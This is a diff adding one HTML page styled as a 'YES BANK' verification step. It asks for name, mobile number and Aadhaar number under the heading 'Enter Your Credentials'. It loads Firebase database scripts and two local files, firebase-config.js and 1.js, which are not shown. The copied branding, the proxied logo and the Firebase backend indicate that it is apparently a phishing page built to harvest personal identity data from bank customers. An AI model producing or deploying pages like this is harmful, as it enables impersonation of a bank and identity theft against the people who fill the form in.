@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>iris - YES BANK - Step 1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #fff;
+      padding: 20px;
+      margin: 0;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+
+    .logo img {
+      width: 150px;
+      display: block;
+      margin: 0 auto 20px;
+    }
+
+    .section-title {
+      text-align: center;
+      font-weight: bold;
+      text-transform: uppercase;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-weight: bold;
+      margin-top: 10px;
+    }
+
+    input[type="text"], input[type="number"] {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0 15px;
+      border: none;
+      border-bottom: 1px solid #aaa;
+      font-size: 16px;
+    }
+
+    .disclaimer {
+      font-size: 12px;
+      display: flex;
+      margin-bottom: 20px;
+    }
+
+    .disclaimer input {
+      margin-top: 3px;
+      margin-right: 10px;
+    }
+
+    .button-group {
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .back-button {
+      background: #fff;
+      border: 1px solid #e91e63;
+      color: #e91e63;
+      padding: 12px;
+      border-radius: 25px;
+      flex: 1;
+      margin-right: 5px;
+    }
+
+    .proceed-button {
+      background: #e91e63;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 25px;
+      flex: 1;
+      margin-left: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://imgs.search.brave.com/a7JunU7klRpwmMvss_0rtLG3kgr_sJ8rXiUqnEbMq_0/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9icmFu/ZGVwcy5jb20vbG9n/by1kb3dubG9hZC9Z/L1llcy1CYW5rLWxv/Z28tdmVjdG9yLTAx/LnN2Zw" alt="YES BANK Logo" />
+    </div>
+
+    <div class="section-title">Enter Your Credentials</div>
+
+    <form id="ududip007">
+      <label for="aname">Name</label>
+      <input type="text" id="aname" required />
+
+      <label for="bmobile">Mobile Number</label>
+      <input type="number" id="bmobile" required />
+
+      <label for="cac">Aadhaar Number / Virtual ID</label>
+      <input type="number" id="cac" required />
+
+      <div class="disclaimer">
+        <input type="checkbox" id="consent" required />
+        <label for="consent">I, hereby submit voluntarily... UIDAI for verification purposes.</label>
+      </div>
+
+      <div class="button-group">
+        <button type="button" class="back-button">Back</button>
+        <button type="submit" class="proceed-button">Proceed</button>
+      </div>
+    </form>
+  </div>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
+  <!-- Separate Firebase logic -->
+  <script src="firebase-config.js"></script>
+  <script src="1.js"></script>
+</body>
+</html>
